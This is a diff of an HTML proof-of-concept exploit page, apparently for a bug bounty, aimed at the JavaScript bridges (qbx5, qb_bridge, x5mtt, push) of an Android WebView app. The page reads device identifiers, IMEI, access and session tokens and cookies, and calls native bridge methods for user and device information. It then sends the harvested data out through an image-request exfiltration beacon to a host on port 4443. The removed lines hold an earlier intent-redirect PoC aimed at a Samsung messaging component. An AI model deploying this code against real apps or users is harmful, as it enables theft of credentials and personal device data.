@@ -1,29 +1,138 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-    <head>
-        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-        <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-        <meta http-equiv="Pragma" content="no-cache" />
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta http-equiv="Expires" content="0" />
-        <title>this is hack.html</title>
-    </head>
-    
-    <body>
-        <p id="content">这里是lx866 poc index 页面!</p>
-        <br/>
-        <br/>
-	<br/>
-	<br/>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Device Info</title></head>
+<body style="font:11px monospace;background:#111;color:#0f0;padding:8px;word-break:break-all">
+<h3 style="color:#e94560;margin:4px 0">HonorShop v26 — X5 Bridge Exploitation</h3>
+<pre id="out">Extracting...</pre>
+<script>
+var out = document.getElementById('out');
+var lines = [];
+function log(s) { lines.push(s); out.textContent = lines.join('\n'); }
 
-	<script>	
-		document.location.href='intent://150@media/external/images/media/20#Intent;scheme=content;action=android.intent.action.SEND;component=com.samsung.android.messaging/.ui.view.bot.LocalBrowserActivity;end';
-		</script>
-        
-    </body>
-</html>
+log('===== DEVICE INFO EXTRACTION (qbx5) =====');
+try {
+  var q = window.qbx5;
+  if (q) {
+    // Read all string/number properties
+    var props = ['deviceName','devicePlatform','deviceVersion','deviceModel','deviceBrand',
+      'deviceId','deviceIMEI','deviceSN','deviceSerial','deviceMac','deviceIP',
+      'appVersion','appName','appId','sdkVersion','kernelVersion','tbsVersion',
+      'uuid','userId','token','accessToken','sessionId','channel','language','country'];
+    for (var i = 0; i < props.length; i++) {
+      try {
+        var v = q[props[i]];
+        if (v !== undefined && v !== null && v !== '') {
+          log('  [!] qbx5.' + props[i] + ' = ' + v);
+        }
+      } catch(e) {}
+    }
+    // Enumerate ALL properties
+    log('\n  All qbx5 properties:');
+    for (var k in q) {
+      try {
+        var val = q[k];
+        var type = typeof val;
+        if (type === 'string' || type === 'number' || type === 'boolean') {
+          log('  qbx5.' + k + ' = ' + val + ' [' + type + ']');
+        } else {
+          log('  qbx5.' + k + ' [' + type + ']');
+        }
+      } catch(e) { log('  qbx5.' + k + ' ERROR: ' + e.message); }
+    }
+    // Try toString
+    try { log('\n  qbx5.toString() = ' + q.toString()); } catch(e) {}
+    // Try QbInfo methods
+    try {
+      var keys = Object.getOwnPropertyNames(Object.getPrototypeOf(q));
+      log('  Proto methods: ' + keys.join(', '));
+    } catch(e) {}
+  }
+} catch(e) { log('qbx5 error: ' + e.message); }
 
+log('\n===== NATIVE EXEC (qb_bridge) =====');
+try {
+  var qb = window.qb_bridge;
+  if (qb) {
+    // Try nativeExec with various common commands
+    log('  qb_bridge type: ' + typeof qb);
+    try {
+      var r1 = qb.nativeExec('wirebridge://wirebridge.queryInfo?params={}');
+      log('  [!] nativeExec queryInfo: ' + r1);
+    } catch(e) { log('  nativeExec queryInfo err: ' + e.message); }
+    try {
+      var r2 = qb.nativeExec('wirebridge://wirebridge.queryDevice?params={}');
+      log('  [!] nativeExec queryDevice: ' + r2);
+    } catch(e) { log('  nativeExec queryDevice err: ' + e.message); }
+    try {
+      var r3 = qb.nativeExec('wirebridge://wirebridge.queryUserInfo?params={}');
+      log('  [!] nativeExec queryUserInfo: ' + r3);
+    } catch(e) { log('  nativeExec queryUserInfo err: ' + e.message); }
+    // Enumerate all qb_bridge methods
+    for (var k in qb) {
+      try { log('  qb_bridge.' + k + ' [' + typeof qb[k] + ']'); } catch(e) {}
+    }
+  }
+} catch(e) { log('qb_bridge error: ' + e.message); }
 
-<?php
-phpinfo();
-?>
+log('\n===== ACCOUNT INFO (x5mtt) =====');
+try {
+  var x5 = window.x5mtt;
+  if (x5) {
+    // Enumerate all methods and properties
+    for (var k in x5) {
+      try {
+        var val = x5[k];
+        var type = typeof val;
+        if (type === 'string' || type === 'number' || type === 'boolean') {
+          log('  [!] x5mtt.' + k + ' = ' + val);
+        } else if (type === 'function') {
+          log('  x5mtt.' + k + '()');
+          // Try calling with no args
+          try {
+            var r = val.call(x5);
+            if (r !== undefined && r !== null) log('    -> ' + JSON.stringify(r).substring(0,200));
+          } catch(e2) { log('    -> err: ' + e2.message); }
+        }
+      } catch(e) {}
+    }
+  }
+} catch(e) { log('x5mtt error: ' + e.message); }
+
+log('\n===== PUSH TOKEN (push) =====');
+try {
+  var p = window.push;
+  if (p) {
+    for (var k in p) {
+      try {
+        log('  push.' + k + ' [' + typeof p[k] + ']');
+        if (typeof p[k] === 'function') {
+          try {
+            var r = p[k].call(p);
+            if (r) log('    -> ' + r);
+          } catch(e2) {}
+        }
+      } catch(e) {}
+    }
+  }
+} catch(e) { log('push error: ' + e.message); }
+
+log('\n===== ENVIRONMENT =====');
+log('UA: ' + navigator.userAgent);
+log('URL: ' + location.href);
+log('Cookie: ' + document.cookie);
+log('Timestamp: ' + new Date().toISOString());
+
+// Exfiltration beacon
+var stolen = {};
+try {
+  var q = window.qbx5;
+  if (q) {
+    for (var k in q) {
+      try { var v = q[k]; if (typeof v !== 'function') stolen[k] = v; } catch(e) {}
+    }
+  }
+} catch(e) {}
+stolen.ua = navigator.userAgent;
+stolen.url = location.href;
+new Image().src = 'https://127.0.0.1:4443/exfil?stolen=' + encodeURIComponent(JSON.stringify(stolen));
+</script></body></html>
